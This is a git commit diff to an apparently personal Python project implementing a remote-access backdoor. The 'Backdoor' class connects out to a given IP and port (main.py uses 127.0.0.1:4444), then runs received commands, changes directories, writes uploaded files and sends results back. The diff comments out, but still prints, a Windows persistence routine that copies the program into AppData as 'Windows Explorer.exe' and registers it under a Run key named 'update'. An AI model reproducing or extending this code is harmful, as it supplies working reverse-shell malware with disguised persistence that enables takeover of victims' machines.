f294c99cea7960fa7b6dafd100ff8b9b2b0f9c21
numberx <shekooha696@gmail.com>
2022-01-14 20:10:05 +0330

    Fixed indent Error

---
+++ main.py
@@ -0,0 +1,2 @@
+from sshServer import Backdoor
+balls = Backdoor("127.0.0.1", 4444)
--- sshServer.py
+++ sshServer.py
@@ -7,32 +7,26 @@ import base64
 import sys
 import shutil
 
-
+#TODO: ENVIROMENT CAR APPDATA IS ON WINDOWS
 class Backdoor():
     def __init__(self, ip, port):
-        self.persistence()
+        # self.persistence()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
-    def persistence(self):
-        location = os.environ["appdata"] + "\\Windows Explorer.exe"
-        if not os.path.exists(location):
-            shutil.copyfile(sys.executable, location)
-            subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)
+    # def persistence(self):
+    #     location = os.environ["appdata"] + "\\Windows Explorer.exe"
+    #     if not os.path.exists(location):
+    #         shutil.copyfile(sys.executable, location)
+    #         subprocess.call('reg add HKCU\Software\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + location + '"' , shell=True)
 
     def cmd_send(self, data):
-    	"""
-    	Send data in base64 format
-    	"""
+    	
         json_send = json.dumps(data)
         self.connection.send(json_send)
 
     def cmd_recv(self):
         
-    	"""
-    	recive data in base64 format
-    	"""
-
         json_recived = ""
 
         while True:
@@ -42,17 +36,12 @@ class Backdoor():
             except ValueError:
                 continue
     def change_dir(self, path):
-        """
-        Changes current directory to $path
-        """
-
+        
         os.chdir(path)
     
         return "Changed dir to %s" % path
     def upload_file(self, path, content):
-    	"""
-    	Uploads file
-    	""" 
+    	
         with open(path, "wb") as file:
             uploaded_file = base64.b64decode(content)
             file.write(uploaded_file)
@@ -84,6 +73,6 @@ class Backdoor():
                 else:
                     cmd_rslt = self.exec_command(rcvd_cmd)
             except Exception as e :
-                cmd_rslt = "[-] Error During Command Execution.\n ERROR:\t{e}\t"
+                    cmd_rslt = "[-] Error During Command Execution.\n ERROR:\t{e}\t"
 
             self.cmd_send(cmd_rslt)
